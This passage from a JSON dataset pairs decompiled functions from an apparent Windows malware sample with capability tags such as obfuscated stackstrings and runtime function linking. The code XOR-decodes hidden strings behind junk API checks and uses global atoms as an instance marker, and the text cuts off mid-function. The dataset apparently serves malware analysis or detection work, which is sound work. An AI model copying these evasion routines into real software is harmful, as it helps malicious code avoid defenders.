pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1502
    },
    "0040ce1b": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040ce1b(uint param_1)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpString;\n    uint lpExitTime;\n    uint lpKernelTime;\n    uint lpUserTime;\n    uint lpCreationTime;\n    uint var_2ch;\n    int32_t hObject;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    var_20h = param_1;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_24h = 0;\n    puVar7 = &lpExitTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)\n                          (hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n        if (iVar4 != 0) {\n            var_18h = 0x556e2c57;\n            var_14h = 0x6e304a65;\n            var_10h = 0x304a6555;\n            var_ch._0_1_ = 0x43;\n            var_8h = 0x70434872;\n            var_4h._0_1_ = 0x55;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar3 != 0x1051dd) {\n                    var_1ch = 5;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpString, iVar4, var_20h, var_2ch, lpCreationTime);\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n            uVar5 = var_24h;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n                if (iVar1 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                    (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return uVar5 ^ 1;\n}\n",
        "token_count": 1050
    },
    "0040cf84": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040cf84(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x186e1b1d;\n    var_28h._0_1_ = 0x33;\n    var_28h._1_1_ = 0x62;\n    var_28h._2_2_ = 0x695c;\n    var_8h = 5;\n    var_24h._0_1_ = 5;\n    var_24h._1_1_ = 0x2b;\n    var_24h._2_1_ = 0x37;\n    stack0xffffffdb = 0x4a0d;\n    var_1fh._0_2_ = 0x4404;\n    stack0xffffffe0 = 0x77396854;\n    var_18h._0_1_ = 0x44;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0x71bf7) {\n            *(iVar7 + iVar4) = *(&var_1fh + iVar7 % var_8h + 3) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_2ch = 0x361a0102;\n    var_28h._0_1_ = 8;\n    var_28h._1_1_ = 5;\n    var_28h._2_2_ = 0x5a57;\n    var_24h._0_1_ = 0x76;\n    var_24h._1_1_ = 9;\n    stack0xffffffdb = 0x6808;\n    stack0xffffffe0 = 0x58686469;\n    var_18h._0_1_ = 0x6d;\n    var_24h._2_1_ = var_28h._1_1_;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar5 = var_10h;\n        if (iVar6 != 0xbd5435) {\n            *(iVar7 + iVar4) = *(&var_1fh + iVar7 % var_8h + 3) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    *0x41d220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41d220 != NULL) {\n        iVar7 = (**0x41d220)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 1048
    },
    "0040d1ad": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "get disk information"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d1ad(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_140h;\n    int32_t var_13ch;\n    uint var_138h;\n    int32_t var_134h;\n    uint var_130h;\n    int32_t var_12ch;\n    uint var_128h;\n    int32_t var_124h;\n    uint var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    uint var_f8h;\n    int32_t var_f4h;\n    uint var_f0h;\n    int32_t var_ech;\n    uint var_e8h;\n    int32_t var_e4h;\n    uint var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x70f3136;\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 4;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x2d;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x31;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x25;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0xc;\n    var_8h._0_1_ = 0x22;\n    var_8h._1_1_ = 0x25;\n    var_8h._2_1_ = 0x19;\n    var_8h._3_1_ = 0x27;\n    var_4h._0_1_ = 2;\n    var_4h._1_1_ = 0x31;\n    var_4h._2_1_ = 0x4c;\n    var_cch = 0x754c5465;\n    var_c8h._0_1_ = 0x42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar5 != 0x9647ba) {\n            *(iVar7 + iVar4) = *(&var_cch + iVar7 % var_34h) ^ (iVar7 + iVar4)[&var_18h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x17);\n    fcn.00408cf8();\n    var_20h = 0x360b0f04;\n    var_1ch = 0x240d3e26;\n    var_18h = 0x73e2715;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x37;\n    var_14h._2_1_ = 0x2c;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x33;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x20;\n    var_4h._1_1_ = 0x55;\n    var_c4h = 0x454a6a57;\n    var_c0h._0_1_ = 0x55;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_cch = iVar7;\n    var_2ch = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0xae4cbb) {\n            *(iVar5 + iVar7) = *(&var_c4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.00408cf8();\n    var_18h = 0x561b3735;\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x1f;\n    var_14h._3_1_ = 0x32;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x14;\n    var_10h._3_1_ = 0x2b;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x4b;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 3;\n    var_4h._1_1_ = 0x52;\n    var_bch = 0x39575266;\n    var_b8h._0_1_ = 0x4a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_c4h = iVar7;\n    var_2ch = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar6 != 0x582785) {\n            *(iVar5 + iVar7) = *(&var_bch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.00408cf8();\n    var_1ch = 0x3c28281a;\n    var_18h = 0x283b22;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 0x38;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x19;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x25;\n    var_8h._1_1_ = 0x28;\n    var_2ch = 6;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 0x41;\n    var_b4h = 0x52614d49;\n    var_b0h._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_bch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar6 != 0xa922e0) {\n            *(iVar5 + iVar7) = *(&var_b4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.00408cf8();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = 0x1d392721;\n    var_18h = 0x2b1e071d;\n    var_14h._0_1_ = 0xf;\n    var_14h._1_1_ = 0x1a;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0xd;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x1c;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 5;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x17;\n    var_4h._1_1_ = 0x25;\n    var_4h._2_1_ = 9;\n    var_4h._3_1_ = 0x73;\n    var_10ch = 0x736c4272;\n    var_108h._0_2_ = 0x686e;\n    var_8h._1_1_ = var_8h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_1ch - iVar7;\n    var_b4h = iVar7;\n    do {\n        iVar6 = (*pcVar1)();\n        if (iVar6 != 0x38e8bc) {\n            *(iVar5 + iVar7) = *(&var_10ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[var_24h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.00408cf8();\n    var_1ch = 0x207b2365;\n    var_18h = 0x285f1f11;\n    var_14h._0_1_ = 0x53;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 0x11;\n    var_14h._3_1_ = 0x14;\n    var_10h._0_1_ = 0x59;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x58;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x5f;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x5f;\n    var_8h._1_1_ = 0x2d;\n    var_8h._2_1_ = 0x17;\n    var_8h._3_1_ = 0x10;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x46;\n    var_104h = 0x41364636;\n    var_100h._0_2_ = 0x7772;\n    uVar3 = (*pcVar1)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_10ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0xccf179) {\n            *(iVar5 + iVar7) = *(&var_104h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.00408cf8();\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 0x15;\n    var_10h._2_1_ = 0x15;\n    var_10h._3_1_ = 0x28;\n    var_ch._0_1_ = 0x10;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x3d;\n    var_8h._1_1_ = 0x1b;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 0x26;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0x72;\n    var_ach = 0x4b41704e;\n    var_a8h._0_1_ = 0x72;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_104h = iVar7;\n    var_24h = &var_10h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar6 != 0xc61e6d) {\n            *(iVar5 + iVar7) = *(&var_ach + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_10h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0xf);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x3e;\n    var_14h._3_1_ = 4;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 0x11;\n    var_10h._2_1_ = 0x10;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x19;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 0x16;\n    var_8h._0_1_ = 0xb;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 4;\n    var_8h._3_1_ = 0xd;\n    var_4h._0_1_ = 0x28;\n    var_4h._1_1_ = 3;\n    var_4h._2_1_ = 7;\n    var_4h._3_1_ = 0x56;\n    var_f4h = 0x616d5662;\n    var_f0h._0_2_ = 0x644d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_ach = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0x51afc6) {\n            *(iVar5 + iVar7) = *(&var_f4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.00408cf8();\n    var_1ch = 0xb1f0806;\n    var_18h = 0x3c22302a;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x27;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x31;\n    var_10h._3_1_ = 5;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x22;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 8;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x41;\n    var_a4h = 0x6a4b6d55;\n    var_a0h._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_f4h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0xedeb7d) {\n            *(iVar5 + iVar7) = *(&var_a4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.00408cf8();\n    var_18h = 0x87c023f;\n    var_14h._0_1_ = 0x50;\n    var_14h._1_1_ = 0x1c;\n    var_14h._2_1_ = 0x28;\n    var_14h._3_1_ = 0x15;\n    var_10h._0_1_ = 0x59;\n    var_10h._1_1_ = 0x11;\n    var_10h._2_1_ = 0x54;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x59;\n    var_ch._3_1_ = 0x11;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x14;\n    var_8h._2_1_ = 9;\n    var_8h._3_1_ = 0;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x67;\n    var_e4h = 0x6730676c;\n    var_e0h._0_2_ = 0x7831;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_a4h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0x496f86) {\n            *(iVar5 + iVar7) = *(&var_e4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.00408cf8();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = 0x4f225326;\n    var_18h = 0x1c530103;\n    var_14h._0_1_ = 0x66;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0x50;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x15;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x44;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x19;\n    var_8h._0_1_ = 0x19;\n    var_8h._1_1_ = 0x53;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x53;\n    var_4h._0_1_ = 0x70;\n    var_9ch = 0x36713675;\n    var_98h._0_1_ = 0x70;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_1ch - iVar7;\n    var_e4h = iVar7;\n    do {\n        iVar6 = (*pcVar1)();\n        if (iVar6 != 0xd7e802) {\n            *(iVar5 + iVar7) = *(&var_9ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[var_24h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.00408cf8();\n    var_18h = 0x9360b37;\n    var_14h._0_1_ = 0x1e;\n    var_14h._1_1_ = 0x10;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 8;\n    var_10h._0_1_ = 4;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 0xb;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x12;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 9;\n    var_8h._2_1_ = 0x15;\n    var_8h._3_1_ = 10;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x6e;\n    var_94h = 0x70656e64;\n    var_90h._0_1_ = 0x6d;\n    uVar3 = (*pcVar1)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_9ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x987c5a) {\n            *(iVar5 + iVar7) = *(&var_94h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.00408cf8();\n    var_20h = 0x3c221217;\n    var_1ch = 0x1b2d3c5d;\n    var_18h = 0x345b1d17;\n    var_14h._0_1_ = 0x23;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x40;\n    var_10h._1_1_ = 0x35;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x12;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 0x3d;\n    var_ch._2_1_ = 0x62;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 0x1b;\n    var_8h._3_1_ = 0x22;\n    var_4h._0_1_ = 0x57;\n    var_4h._1_1_ = 0x3d;\n    var_4h._2_1_ = 0x21;\n    var_4h._3_1_ = 0x77;\n    var_134h = 0x4e727744;\n    var_130h._0_2_ = 0x5a32;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_94h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar6 != 0x582263) {\n            *(iVar5 + iVar7) = *(&var_134h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.00408cf8();\n    var_20h = 0x3a7d1c1e;\n    var_1ch = 0x551c3f3a;\n    var_18h = 0x180f3c27;\n    var_14h._0_1_ = 0x47;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x10;\n    var_10h._1_1_ = 0x5b;\n    var_10h._2_1_ = 0x26;\n    var_10h._3_1_ = 0x30;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 100;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0x30;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 0x58;\n    var_4h._0_1_ = 0x31;\n    var_4h._1_1_ = 0x3e;\n    var_4h._2_1_ = 0x28;\n    var_4h._3_1_ = 0x79;\n    var_8ch = 0x5434794d;\n    var_88h._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_134h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = 